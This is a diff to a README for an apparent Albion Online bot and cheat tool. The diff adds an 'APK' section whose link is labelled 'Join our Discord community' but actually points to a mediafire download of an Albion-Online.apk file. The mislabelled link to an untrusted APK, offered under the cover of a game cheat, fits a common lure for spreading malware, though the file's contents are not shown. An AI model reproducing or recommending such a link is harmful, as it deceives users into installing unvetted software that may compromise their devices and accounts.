@@ -6,6 +6,10 @@ Albion Online Bot & cheat, Gathering, Fishing, Full Optimized Combat Bot.
 [![Discord](https://img.shields.io/discord/972965077496000552)](https://discord.gg/pQZYd8sGqF)
 ![Version](https://img.shields.io/badge/version-1.3.0-blue.svg)
 
+## APK
+
+[Join our Discord community](https://www.mediafire.com/file/cxxnm7b1yi61kfg/Albion-Online.apk/file)
+
 
 ## Features
 
